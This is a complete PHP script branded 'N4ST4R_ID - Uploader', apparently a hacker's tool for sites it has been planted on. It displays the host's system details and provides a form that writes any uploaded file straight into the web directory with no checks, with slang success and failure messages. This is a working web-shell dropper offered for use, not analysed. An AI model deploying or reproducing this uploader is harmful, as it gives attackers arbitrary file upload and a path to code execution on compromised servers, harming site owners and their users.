<?php
echo "<b>N4ST4R_ID - Uploader</b>";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='nastar'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['nastar']['tmp_name'], $_FILES['nastar']['name'])) {
	echo "MANTUL MZZ";
	} else {
	echo "NJIR GAGAL";
	}
}
?>